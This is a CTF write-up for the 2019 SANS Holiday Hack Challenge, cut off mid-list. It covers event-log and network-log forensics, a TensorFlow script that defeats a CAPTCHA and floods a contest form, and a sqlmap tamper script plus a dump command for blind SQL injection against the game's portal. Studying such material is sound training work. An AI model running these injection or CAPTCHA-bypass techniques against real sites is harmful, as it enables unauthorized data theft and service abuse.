@media print,amzn-kf8{#header>h1:first-child{margin-top:1.25rem}
.sect1{padding:0!important}
.sect1+.sect1{border:0}
#footer{background:none}
#footer-text{color:rgba(0,0,0,.6);font-size:.9em}}
@media amzn-kf8{#header,#content,#footnotes,#footer{padding:0}}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body class="article">
<div id="header">
<h1>The 2019 SANS Holiday Hack Challenge Writeup</h1>
<div class="details">
<span id="author" class="author">Istvan Toth &lt;an0n@tuta.io&gt;, an0nr0, @an0n_r0</span><br>
<span id="revnumber">version 1.0,</span>
<span id="revdate">2020-01-13 (Winners update on 2020-02-13)</span>
</div>
</div>
<div id="content">
<div id="preamble">
<div class="sectionbody">
<div class="paragraph lead">
<p>This is just a short, brief, technical writeup of the Blue Team
focused 2019 SANS Holiday Hack Challenge. If you are interested in the
whole story and progress, play it.  Maybe next time, at the end of
2020. ;) The game is much more than this brief writeup.</p>
</div>
<div class="admonitionblock important">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>As of the <a href="https://www.holidayhackchallenge.com/2019/winners_answers.html">Winners and Answers report</a> announced at the
<a href="https://www.sans.org/webcasts/2019-holiday-hack-challenge-award-ceremony-113100">Closing Ceremony</a>, this writeup had been selected into the
<strong>SUPER HONORABLE MENTIONS</strong> category:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>For our next category, we&#8217;ve got a group of people who really went above and beyond with their entries. Their write-ups were SUPERB, demonstrating excellent technical skills along with impressive communication skills. Congrats to those earning a Super Honorable Mention.</p>
</div>
</blockquote>
</div>
<div class="paragraph">
<p>For some statistics:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>14,912 Total Number of Players</p>
</li>
<li>
<p>375 Crossed the Finish Line</p>
</li>
<li>
<p>303 Reports Submitted</p>
</li>
</ul>
</div>
</td>
</tr>
</table>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_narrative_10_of_10">Narrative [10 of 10]</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Parts of the "Narrative" text appears as a progress of the
completed objectives.</p>
</div>
<div class="paragraph">
<p>After completing the whole game, it is 10 of 10. Here is the
full text:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>Whose grounds these are, I think I know
His home is in the North Pole though
He will not mind me traipsing here
To watch his students learn and grow
Some other folk might stop and sneer
"Two turtle doves, this man did rear?"
I'll find the birds, come push or shove
Objectives given: I'll soon clear
Upon discov'ring each white dove,
The subject of much campus love,
I find the challenges are more
Than one can count on woolen glove.
Who wandered thus through closet door?
Ho ho, what's this? What strange boudoir!
Things here cannot be what they seem
That portal's more than clothing store.
Who enters contests by the ream
And lives in tunnels meant for steam?
This Krampus bloke seems rather strange
And yet I must now join his team...
Despite this fellow's funk and mange
My fate, I think, he's bound to change.
What is this contest all about?
His victory I shall arrange!
To arms, my friends! Do scream and shout!
Some villain targets Santa's route!
What scum - what filth would seek to end
Kris Kringle's journey while he's out?
Surprised, I am, but "shock" may tend
To overstate and condescend.
'Tis little more than plot reveal
That fairies often do extend
And yet, despite her jealous zeal,
My skills did win, my hacking heal!
No dental dealer can so keep
Our red-clad hero in ordeal!
This Christmas must now fall asleep,
But next year comes, and troubles creep.
And Jack Frost hasn't made a peep,
And Jack Frost hasn't made a peep...</pre>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_objectives">Objectives</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="obj00">0) Talk to Santa in the Quad</h3>
<div class="openblock float-group">
<div class="content">
<div class="paragraph">
<p><span class="image related right"><img src="images/obj00_talktosanta.png" alt="obj00 talktosanta" width="200"></span></p>
</div>
<div class="paragraph">
<p>Task: Enter the campus quad and talk to Santa.</p>
</div>
<div class="paragraph">
<p>This is just an introduction "objective" without any hacking challenges.</p>
</div>
<div class="paragraph">
<p>Solution: Move out the avatar to the Quad and click Santa.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="obj01">1) Find the Turtle Doves</h3>
<div class="openblock float-group">
<div class="content">
<div class="paragraph">
<p><span class="image related left"><img src="images/obj01_turtledoves.png" alt="obj01 turtledoves" width="200"></span></p>
</div>
<div class="paragraph">
<p>Task: Find the missing turtle doves.</p>
</div>
<div class="paragraph">
<p>There is still no hacking challenge.</p>
</div>
<div class="paragraph">
<p>Solution: The missing turtle doves can be found in the Student Union
(north to the Quad).</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="obj02">2) Unredact Threating Document</h3>
<div class="openblock float-group">
<div class="content">
<div class="paragraph">
<p><span class="image related right"><img src="images/obj02_letter.png" alt="obj02 letter" width="200"></span></p>
</div>
<div class="paragraph">
<p>Task: Someone sent a threatening letter to Elf University. What is the
first word in ALL CAPS in the subject line of the letter? Please find
the letter in the Quad.</p>
</div>
<div class="paragraph">
<p>This is the first hacking challenge marked with difficulty 1/5.</p>
</div>
<div class="paragraph">
<p>Solution: The letter can be found in the NW corner of the Quad.</p>
</div>
<div class="paragraph">
<p>Here is the downloadable PDF:
<a href="https://downloads.elfu.org/LetterToElfUPersonnel.pdf" class="bare">https://downloads.elfu.org/LetterToElfUPersonnel.pdf</a></p>
</div>
</div>
</div>
<div class="paragraph">
<p>Some parts of the letter is covered with a box making it
"Confidential".  However, the text is still there, below the box. It
can be extracted from the PDF, or much simpler, it can be selected
(and copy &amp; pasted or some viewers, like evince show it).</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj02_letter_uncovered.png" alt="obj02 letter uncovered">
</div>
<div class="title">Objective 2: Text selected below covering box (using viewer evince)</div>
</div>
<div class="paragraph">
<p>The answer is: "DEMAND".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj03">3) Windows Log Analysis: Evaluate Attack Outcome</h3>
<div class="paragraph">
<p>Task: We&#8217;re seeing attacks against the Elf U domain! Using
<a href="https://downloads.elfu.org/Security.evtx.zip" target="_blank" rel="noopener">the event log data</a>,
identify the user account that the attacker compromised
using a password spray attack. Bushy Evergreen is hanging out in the
train station and may be able to help you out.</p>
</div>
<div class="paragraph">
<p>Difficulty: 1/5</p>
</div>
<div class="paragraph">
<p>Solution: <a href="https://github.com/sans-blue-team/DeepBlueCLI" target="_blank" rel="noopener">DeepBlueCLI</a>
helps analyzing the Windows Event Log.
Using Windows PowerShell is mandatory.</p>
</div>
<div class="paragraph">
<p>Processing the evtx log and extracting suspicious information:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>.\DeepBlue.ps1 Security.evtx | ConvertTo-Html | Out-File security-deepblue.html</pre>
</div>
</div>
<div class="paragraph">
<p>The resulting html is a human-readable summary of the intrusion events.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj03_deepblue.png" alt="obj03 deepblue">
</div>
<div class="title">Objective 3: DeepBlueCLI processed Security.evtx log</div>
</div>
<div class="paragraph">
<p>Note, that a lots of users has a large number (77) of logon failures,
while user "supatree" has 76 logon failures and 2 successful logon events.
This is a typical password spraying attack, resulting "supatree" as
a compromised user.</p>
</div>
<div class="paragraph">
<p>The answer is "supatree".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj04">4) Windows Log Analysis: Determine Attacker Technique</h3>
<div class="paragraph">
<p>Task: Using
<a href="https://downloads.elfu.org/sysmon-data.json.zip">these normalized Sysmon logs</a>,
identify the tool the attacker used to
retrieve domain password hashes from the lsass.exe process. For hints
on achieving this objective, please visit Hermey Hall and talk with
SugarPlum Mary.</p>
</div>
<div class="paragraph">
<p>Difficulty: 2/5</p>
</div>
<div class="paragraph">
<p>Solution: Use the <a href="https://eql.readthedocs.io/en/latest/">Event Query Language</a>
for the normalized (JSON) Sysmon logs.</p>
</div>
<div class="paragraph">
<p>The normalized Sysmon log contains mostly <code>process</code> type events,
those should be the most interesting for us. Let us filter the
processes whose parent process is <code>cmd.exe</code>. These are a lot,
let us exclude the uninteresting <code>net.exe</code> commands:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>eql query -f ./sysmon-data.json "process where event_type = 'process' and parent_process_name = 'cmd.exe' and process_name != 'net.exe'" | jq</pre>
</div>
</div>
<div class="paragraph">
<p>The results are two PowerShell commands and this:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj04_eql.png" alt="obj04 eql">
</div>
</div>
<div class="paragraph">
<p>This last one is about creating a backup of the ntds database
containing the domain password hashes using the <code>ntdsutil.exe</code>
Windows AD command line tool.</p>
</div>
<div class="paragraph">
<p>So the answer is "ntdsutil.exe".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj05">5) Network Log Analysis: Determine Compromised System</h3>
<div class="paragraph">
<p>Task: The attacks don&#8217;t stop! Can you help identify the IP address of
the malware-infected system using these
<a href="https://downloads.elfu.org/elfu-zeeklogs.zip">Zeek logs</a>? For hints on
achieving this objective, please visit the Laboratory and talk with
Sparkle Redberry.</p>
</div>
<div class="paragraph">
<p>Difficulty: 2/5</p>
</div>
<div class="paragraph">
<p>Solution: The Zeek logs contain
<a href="https://github.com/activecm/rita">Real Intelligence Threat Analytics (RITA) framework</a>
HTML files in the ELFU folder.</p>
</div>
<div class="paragraph">
<p>Observing the "Long Connections" reveals a suspiciously long connection
from 192.168.134.130 to 148.69.64.76:443. So 192.168.134.130 should be
the infected system in the LAN. Furthermore, the suspiciously high
number of beacons originating the same 192.168.134.130 IP is also
confirming this.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj05_rita_long.png" alt="obj05 rita long">
</div>
<div class="title">Objective 5: RITA showing the Long Connections</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj05_rita_beacons.png" alt="obj05 rita beacons">
</div>
<div class="title">Objective 5: The same source has suspiciously high number of beacons</div>
</div>
<div class="paragraph">
<p>The answer is "192.168.134.130".</p>
</div>
</div>
<div class="sect2">
<h3 id="obj06">6) Splunk</h3>
<div class="paragraph">
<p>Task: Access <a href="https://splunk.elfu.org/" class="bare">https://splunk.elfu.org/</a> as elf with password
elfsocks. What was the message for Kent that the adversary embedded in
this attack? The SOC folks at that link will help you along! For hints
on achieving this objective, please visit the Laboratory in Hermey
Hall and talk with Prof. Banas.</p>
</div>
<div class="paragraph">
<p>Difficulty: 3/5</p>
</div>
<div class="paragraph">
<p>Solution: This challenge is about performing searches in a dedicated
Splunk SOC. Instructions can be found in the chat. There is a search
engine and a file archive for answering the questions.</p>
</div>
<div class="paragraph">
<p>Training questions:</p>
</div>
<div class="paragraph">
<p>1.) What is the short host name of Professor Banas' computer?</p>
</div>
<div class="paragraph">
<p>It is <code>sweetums</code>. (Every log entry is from the ComputerName sweetums.elfu.org)</p>
</div>
<div class="paragraph">
<p>2.) What is the name of the sensitive file that was likely accessed and
copied by the attacker? Please provide the fully qualified location of
the file. (Example: C:\temp\report.pdf)</p>
</div>
<div class="paragraph">
<p>It is <code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code>
(Just search for "index=main cbanas Users").</p>
</div>
<div class="paragraph">
<p>3.) What is the fully-qualified domain name(FQDN) of the command and
control(C2) server? (Example: badguy.baddies.com)</p>
</div>
<div class="paragraph">
<p>Use the recommended search</p>
</div>
<div class="literalblock">
<div class="content">
<pre>index=main sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational powershell EventCode=3</pre>
</div>
</div>
<div class="paragraph">
<p>and select <code>DestinationHostname</code> from the "Interesting Fields" list.</p>
</div>
<div class="paragraph">
<p>It is <code>144.202.46.214.vultr.com</code>.</p>
</div>
<div class="paragraph">
<p>4.) What document is involved with launching the malicious PowerShell
code? Please provide just the filename. (Example: results.txt)</p>
</div>
<div class="paragraph">
<p>Find the starting of PowerShell activity (according to the hint):</p>
</div>
<div class="literalblock">
<div class="content">
<pre>index=main sourcetype="WinEventLog:Microsoft-Windows-Powershell/Operational" | reverse</pre>
</div>
</div>
<div class="paragraph">
<p>Pivot on time window (+-5 sec): process just before the first PowerShell
activity is WINWORD.exe with ProcessId=6268. Clear the time window
and search for ProcessId=6268. Nothing useful. NP, try it with
Windows Process Execution events instead of Sysmon, but here the
ProcessId is in hexadecimal (6268=0x187c):</p>
</div>
<div class="literalblock">
<div class="content">
<pre>index=main EventCode=4688 0x187c</pre>
</div>
</div>
<div class="paragraph">
<p>Only 2 events, one of them is the WINWORD.EXE launch with the malicious
document in the Process Command Line:
<code>19th Century Holiday Cheer Assignment.docm</code></p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj06_splunk_00.png" alt="obj06 splunk 00">
</div>
<div class="title">Objective 6: Opening the malicious docm file with WINWORD.EXE</div>
</div>
<div class="paragraph">
<p>5.) How many unique email addresses were used to send Holiday Cheer
essays to Professor Banas? Please provide the numeric value. (Example:
1)</p>
</div>
<div class="paragraph">
<p>Just follow the directions in the chat and modify the query:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>index=main sourcetype=stoq AND results{}.workers.smtp.subject="Holiday Cheer Assignment Submission" | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time</pre>
</div>
</div>
<div class="paragraph">
<p>The answer is 21.</p>
</div>
<div class="paragraph">
<p>6.) What was the password for the zip archive that contained the
suspicious file?</p>
</div>
<div class="paragraph">
<p>The file came as an email attachment. It is in the previous list. Just
narrow down the search by the filename found above:</p>
</div>
<div class="literalblock">
<div class="content">
<pre>index=main sourcetype=stoq AND results{}.workers.smtp.subject="Holiday Cheer Assignment Submission" AND 19th | table _time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj06_splunk_01.png" alt="obj06 splunk 01">
</div>
<div class="title">Objective 6: Found the email containing the malicious content</div>
</div>
<div class="paragraph">
<p>The zip password is "123456789".</p>
</div>
<div class="paragraph">
<p>7.) What email address did the suspicious file come from?</p>
</div>
<div class="paragraph">
<p>The answer is also available from the previous search (smtp.from field
in the table): "<a href="mailto:bradly.buttercups@eifu.org">bradly.buttercups@eifu.org</a>".</p>
</div>
<div class="paragraph">
<p>Now go for the Challenge Question:</p>
</div>
<div class="paragraph">
<p>FINAL) What was the message for Kent that the adversary embedded in
this attack?</p>
</div>
<div class="paragraph">
<p>Following the advices from the chat the malicious file parts
URLs will be available.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj06_splunk_02.png" alt="obj06 splunk 02">
</div>
<div class="title">Objective 6: Chat in the Elf University SOC</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj06_splunk_03.png" alt="obj06 splunk 03">
</div>
<div class="title">Objective 6: Splunk query for extracting the docm xml paths</div>
</div>
<div class="paragraph">
<p>Now the required files can be downloaded from the
<a href="https://elfu-soc.s3.amazonaws.com/" class="bare">https://elfu-soc.s3.amazonaws.com/</a> server.</p>
</div>
<div class="paragraph">
<p>The <code>core.xml</code> contains the "description" metadata available here:</p>
</div>
<div class="paragraph">
<p><a href="https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4" class="bare">https://elfu-soc.s3.amazonaws.com/stoQ%20Artifacts/home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4</a></p>
</div>
<div class="paragraph">
<p>The message in the description is: "Kent you are so unfair. And we
were going to make you the king of the Winter Carnival.". This is the
answer to the challenge question.</p>
</div>
</div>
<div class="sect2">
<h3 id="obj07">7) Get Access To The Steam Tunnels</h3>
<div class="paragraph">
<p>Task: Gain access to the steam tunnels. Who took the turtle doves?
Please tell us their first and last name. For hints on achieving this
objective, please visit Minty&#8217;s dorm room and talk with Minty Candy
Cane.</p>
</div>
<div class="paragraph">
<p>Difficulty: 3/5</p>
</div>
<div class="paragraph">
<p>Solution: Access to The Steam Tunnels enables some "teleportation" ability.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj07_steam.png" alt="obj07 steam">
</div>
<div class="title">Objective 7: The Steam Tunnel Map</div>
</div>
</div>
<div class="sect2">
<h3 id="obj08">8) Bypassing the Frido Sleigh CAPTEHA</h3>
<div class="paragraph">
<p>Task: Help Krampus beat the
<a href="https://fridosleigh.com/">Frido Sleigh contest</a>. For hints on
achieving this objective, please talk with Alabaster Snowball in the
Speaker Unpreparedness Room.</p>
</div>
<div class="paragraph">
<p>Difficulty: 4/5</p>
</div>
<div class="paragraph">
<p>In order to win the contest, we need to submit a form as many times as
possible within a minute. The problem is that it is protected by a
reverse captcha (so-called CAPTEHA: Completely Automated Public Turing
test to tell Elves and Humans Apart).</p>
</div>
<div class="paragraph">
<p>It cannot be validated by a human, because you have to classify
100 images into 5 categories in 5 seconds. It can be solved only
by a computer.</p>
</div>
<div class="paragraph">
<p>Solution: We should build an ML Model to solve the CAPTEHA. The great
<a href="https://www.youtube.com/watch?v=jmVPLwjm_zs">KringleCon talk of Chris Davis about Machine Learning Use Cases for Cybersecurity</a>
really helps solving this challenge.</p>
</div>
<div class="paragraph">
<p>Steps needed to solve this:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Get the CAPTEHA images (and categories)</p>
</li>
<li>
<p>Manually classify some images into categories</p>
</li>
<li>
<p>Train the ML Model using the manually classified images and a lot more downloaded data set</p>
</li>
<li>
<p>Use the trained model to solve the CAPTEHA (and submit the form as many times as we can ;) )</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>Python script for getting the CAPTEHA images (and labels):</p>
</div>
<div class="listingblock">
<div class="title">getimages.py</div>
<div class="content">
<pre class="highlightjs highlight"><code data-lang="python" class="language-python hljs">#!/usr/bin/python
#

import base64
import re
import requests
import os

URL="https://fridosleigh.com/api/capteha/request"
IMGDIR="./traindata"
ROUNDS=200

i = 0
while i &lt; ROUNDS:
    r = requests.post(URL)

    labels = r.json()['select_type'].split(',')
    labels = list(map(lambda s: re.sub(r'^ (and )?', '', s), labels))
    #print(labels)
    try:
        labels_old = open("%s/labels.txt" % IMGDIR, "r").readlines()
        labels_old = list(map(lambda s: s.strip(), labels_old))
    except:
        labels_old = []
    labels = list(set(labels + labels_old))
    with open("%s/labels.txt" % IMGDIR, "w") as f:
        for label in labels:
            f.write("%s\n" % label)
    print("{} labels, ".format(len(labels)), end=" ")

    for img in r.json()['images']:
        open("%s/%s.png" % (IMGDIR, img['uuid']), "wb").write(base64.b64decode(img['base64']))

    print("{} unique images to train".format(len([name for name in os.listdir(IMGDIR) if name.endswith(".png")])))

    i += 1</code></pre>
</div>
</div>
<div class="paragraph">
<p>Helper script for manual classification (using the great
<a href="https://feh.finalrewind.org/">feh</a> image viewer):</p>
</div>
<div class="listingblock">
<div class="title">pretrain.sh</div>
<div class="content">
<pre class="highlightjs highlight"><code data-lang="bash" class="language-bash hljs">#!/bin/bash
#
# manually classify images

TRAINDATA="./traindata"
IMGROOT="./training_images"
ACTION1=${IMGROOT}/1
ACTION2=${IMGROOT}/2
ACTION3=${IMGROOT}/3
ACTION4=${IMGROOT}/4
ACTION5=${IMGROOT}/5
ACTION6=${IMGROOT}/6

cat &lt;&lt;EOF
1: Presents
2: Candy Canes
3: Santa Hats
4: Stockings
5: Ornaments
6: Christmas Trees
EOF

find $TRAINDATA -type f -name "*.png" | \
    feh --action1 "mv %F ${ACTION1}/%N" \
	--action2 "mv %F ${ACTION2}/%N" \
	--action3 "mv %F ${ACTION3}/%N" \
	--action4 "mv %F ${ACTION4}/%N" \
	--action5 "mv %F ${ACTION5}/%N" \
	--action6 "mv %F ${ACTION6}/%N" -f -</code></pre>
</div>
</div>
<div class="paragraph">
<p>Manual training is enough if all of the categories have ~20 images.</p>
</div>
<div class="paragraph">
<p>Machine learning can be performed by the open-source
<a href="https://www.tensorflow.org">TensorFlow</a> platform.</p>
</div>
<div class="paragraph">
<p>The
<a href="https://github.com/chrisjd20/img_rec_tf_ml_demo">image recognition demo by Chris</a>
needs only slight modifications to use in this situation. However,
installing TensorFlow in a Python virtual env is highly recommended.</p>
</div>
<div class="paragraph">
<p>Use the <code>retrain.py</code> script from the demo to train the model.</p>
</div>
<div class="paragraph">
<p>Once ready (couple of minutes), predicting new images should work
reliably and relatively fast (used a ProLiant DL380e Gen8 with
dual 6-core E5-2420 Xeon ;) ).</p>
</div>
<div class="paragraph">
<p>The <code>predict_images_using_trained_model.py</code> script can be modified
and updated to work with the Frido Sleigh CAPTEHA and form submission:</p>
</div>
<div class="listingblock">
<div class="title">capteha.py</div>
<div class="content">
<pre class="highlightjs highlight"><code data-lang="python" class="language-python hljs">#!/usr/bin/python3
# Image Recognition Using Tensorflow Exmaple.
# Code based on example at:
# https://raw.githubusercontent.com/tensorflow/tensorflow/master/tensorflow/examples/label_image/label_image.py
import os
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
import tensorflow as tf
tf.logging.set_verbosity(tf.logging.ERROR)
import numpy as np
import threading
import queue
import time
import sys
import re
import base64
import requests

# sudo apt install python3-pip
# sudo python3 -m pip install --upgrade pip
# sudo python3 -m pip install --upgrade setuptools
# sudo python3 -m pip install --upgrade tensorflow==1.15

def load_labels(label_file):
    label = []
    proto_as_ascii_lines = tf.gfile.GFile(label_file).readlines()
    for l in proto_as_ascii_lines:
        label.append(l.rstrip())
    return label

def predict_image(q, sess, graph, image_bytes, img_full_path, labels, input_operation, output_operation):
    image = read_tensor_from_image_bytes(image_bytes)
    results = sess.run(output_operation.outputs[0], {
        input_operation.outputs[0]: image
    })
    results = np.squeeze(results)
    prediction = results.argsort()[-5:][::-1][0]
    q.put( {'img_full_path':img_full_path, 'prediction':labels[prediction].title(), 'percent':results[prediction]} )

def load_graph(model_file):
    graph = tf.Graph()
    graph_def = tf.GraphDef()
    with open(model_file, "rb") as f:
        graph_def.ParseFromString(f.read())
    with graph.as_default():
        tf.import_graph_def(graph_def)
    return graph

def read_tensor_from_image_bytes(imagebytes, input_height=299, input_width=299, input_mean=0, input_std=255):
    image_reader = tf.image.decode_png( imagebytes, channels=3, name="png_reader")
    float_caster = tf.cast(image_reader, tf.float32)
    dims_expander = tf.expand_dims(float_caster, 0)
    resized = tf.image.resize_bilinear(dims_expander, [input_height, input_width])
    normalized = tf.divide(tf.subtract(resized, [input_mean]), [input_std])
    sess = tf.compat.v1.Session()
    result = sess.run(normalized)
    return result

def get_captcha(s):
    r = s.post("https://fridosleigh.com/api/capteha/request")
    assert r.status_code == 200
    labels = r.json()['select_type'].split(',')
    labels = list(map(lambda x: re.sub(r'^ (and )?', '', x), labels))
    label_to_idx = {'Presents': '1',
                    'Candy Canes': '2',
                    'Santa Hats': '3',
                    'Stockings': '4',
                    'Ornaments': '5',
                    'Christmas Trees': '6'}
    indexes = list(map(lambda x: label_to_idx[x], labels))
    return r.json()['images'], labels, indexes

def submit_captcha(s, answer):
    r = s.post("https://fridosleigh.com/api/capteha/submit", data={"answer": ','.join(answer)})
    print(r.content.decode())
    return r.json()['request']

def submit_entry(s):
    r = s.post("https://fridosleigh.com/api/entry", data={"about": "about", "email": "an0n@tuta.io", "age": 180, "name": "nothumanelf", "favorites": "snoweos,cupidcrunch"})
    print(r.content.decode())

def main(s):
    # Loading the Trained Machine Learning Model created from running retrain.py on the training_images directory
    graph = load_graph('/tmp/retrain_tmp/output_graph.pb')
    labels = load_labels("/tmp/retrain_tmp/output_labels.txt")

    # Load up our session
    input_operation = graph.get_operation_by_name("import/Placeholder")
    output_operation = graph.get_operation_by_name("import/final_result")
    sess = tf.compat.v1.Session(graph=graph)

    # Can use queues and threading to spead up the processing
    q = queue.Queue()

    # refresh page
    r = s.get("https://fridosleigh.com/")
    assert r.status_code == 200
    print("[+] opened fridosleigh.com")

    # get captcha
    images, names, indexes = get_captcha(s)
    print("[+] fetched captcha: {0} images, have to select labels {1}, {2} and {3}".format(len(images), names[0], names[1], names[2]))

    #Going to interate over each of our images.
    print("[*] processing images...")
    for image in images:
        #print('[*] Processing Image with UUID {}'.format(image['uuid']))
        # We don't want to process too many images at once. 10 threads max
        while len(threading.enumerate()) &gt; 500:
            time.sleep(0.0001)

        #predict_image function is expecting png image bytes so we read image as 'rb' to get a bytes object
        image_bytes = base64.b64decode(image['base64'])
        threading.Thread(target=predict_image, args=(q, sess, graph, image_bytes, image['uuid'], labels, input_operation, output_operation)).start()

    print('[*] Waiting For Threads to Finish...')
    while q.qsize() &lt; len(images):
        time.sleep(0.001)

    #getting a list of all threads returned results
    prediction_results = [q.get() for x in range(q.qsize())]

    #do something with our results... Like print them to the screen and select answers
    answer = []
    for prediction in prediction_results:
        if prediction['prediction'] in indexes:
            answer.append(prediction['img_full_path'])
            print('[+] TensorFlow Predicted {img_full_path} is a {prediction} with {percent:.2%} Accuracy'.format(**prediction))

    # submit captcha
    print("[*] submitting answer ({} images selected)".format(len(answer)))
    if submit_captcha(s, answer):
        # submit entry
        while True:
            print("[*] submitting entry")
            submit_entry(s)
    else:
        print("[!] AI error, retrying")

if __name__ == "__main__":
    s = requests.Session()
    while True:
        main(s)</code></pre>
</div>
</div>
<div class="paragraph">
<p>After a lot of quick submissions the Frido Sleigh system replies
with a winner message, and the winning code should land by email.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj08_capteha_win.png" alt="obj08 capteha win">
</div>
<div class="title">Objective 8: The winning message</div>
</div>
<div class="paragraph">
<p>The code is "8Ia8LiZEwvyZr2WO".</p>
</div>
</div>
<div class="sect2">
<h3 id="_9_retrieve_scarps_of_paper_from_server">9) Retrieve Scarps of Paper from Server</h3>
<div class="paragraph">
<p>Task: Gain access to the data on the
<a href="https://studentportal.elfu.org/">Student Portal</a> server and
retrieve the paper scraps hosted there. What is the name of Santa&#8217;s
cutting-edge sleigh guidance system? For hints on achieving this
objective, please visit the dorm and talk with Pepper Minstix.</p>
</div>
<div class="paragraph">
<p>Solution: One can quickly detect that the application-check.php
script has SQL injection vulnerability in the elfmail parameter.</p>
</div>
<div class="paragraph">
<div class="title">SQL injection detected</div>
<p><span class="image"><img src="images/obj09_sqli_detect.png" alt="obj09 sqli detect"></span></p>
</div>
<div class="paragraph">
<p>It could be exploited by boolean-blind based technique, but there
is a (weak) protection which makes our life a little bit harder.</p>
</div>
<div class="paragraph">
<p>The email checking process is the following:</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Pressing the "Check Status" button on the check.php page 1st calls
validator.php which returns a token</p>
</li>
<li>
<p>Then the check.php page calls the application-check.php with the
email address, but the token is also included in the request
If the token is wrong, the check does not performed.</p>
</li>
</ol>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj09_sqli_token.png" alt="obj09 sqli token">
</div>
<div class="title">Objective 9: Token validation process</div>
</div>
<div class="paragraph">
<p>This is an example token:</p>
</div>
<div class="paragraph">
<p>MTAwOTU4NDE4MTEyMTU3NzQ3NTI4MzEwMDk1ODQxOC4xMTI=_MTI5MjI2Nzc1MTgzMzYzMjMwNjY5Mzc5LjU4NA==</p>
</div>
<div class="paragraph">
<p>It is built from two parts separated by <code>_</code>, the 1st and 2nd part
is also a base64 encoded number. Decoding the parts:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>1009584181121577475283100958418.112</p>
</li>
<li>
<p>129226775183363230669379.584</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Although these numbers seem to be predictable (seems to be increasing
almost linearly by time), but let us take a much simpler approach:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>implement the validator.php call in the SQL injection exploit process.</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>This can be achieved easily using the famous
<a href="http://sqlmap.org/">sqlmap</a> tool by <a href="https://twitter.com/stamparm">@stamparm</a>.</p>
</div>
<div class="paragraph">
<p>We just need to add a custom tamper script (in /sqlmap/tamper folder):</p>
</div>
<div class="listingblock">
<div class="title">sans2019.py</div>
<div class="content">
<pre class="highlightjs highlight"><code data-lang="python" class="language-python hljs">#!/usr/bin/env python

from lib.core.enums import PRIORITY

import requests
import urllib.parse

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def myvalidator():
    r = requests.get("https://studentportal.elfu.org/validator.php")
    return r.content.decode()

def tamper(payload, **kwargs):
    payload = urllib.parse.quote(payload) + '&amp;token=' + urllib.parse.quote(myvalidator())
    return payload</code></pre>
</div>
</div>
<div class="paragraph">
<p>And do not forget to skip urlencode of the "payload" (we added
urlencode for just the actual payload in the parameter in the
tamper script, this "payload" is the real payload appended with
the &amp; separator and the token).</p>
</div>
<div class="paragraph">
<p>Furthermore, the below used <code>email@email.com</code> should be added to
the database (by the "Apply Now" function to make the blind attack work).</p>
</div>
<div class="literalblock">
<div class="content">
<pre>sqlmap -u https://studentportal.elfu.org/application-check.php?elfmail=email@email.com --technique B --tamper sans2019 --skip-urlencode -D elfu --threads 10 -T krampus --dump</pre>
</div>
</div>
<div class="imageblock">
<div class="content">
<img src="images/obj09_sqli_banner.png" alt="obj09 sqli banner">
</div>
<div class="title">Objective 9: Dumping the SQL banner using sqlmap</div>
</div>
<div class="paragraph">
<p>The dumped <code>krampus</code> table contains the paper scraps hidden paths:</p>
</div>
<div class="ulist">
<ul>
<li>
<p><a href="https://studentportal.elfu.org/krampus/0f5f510e.png" class="bare">https://studentportal.elfu.org/krampus/0f5f510e.png</a></p>
</li>
<li>
<p><a href="https://studentportal.elfu.org/krampus/1cc7e121.png" class="bare">https://studentportal.elfu.org/krampus/1cc7e121.png</a></p>
</li>
<li>
<p><a href="https://studentportal.elfu.org/krampus/439f15e6.png" class="bare">https://studentportal.elfu.org/krampus/439f15e6.png</a></p>
</li>
<li>
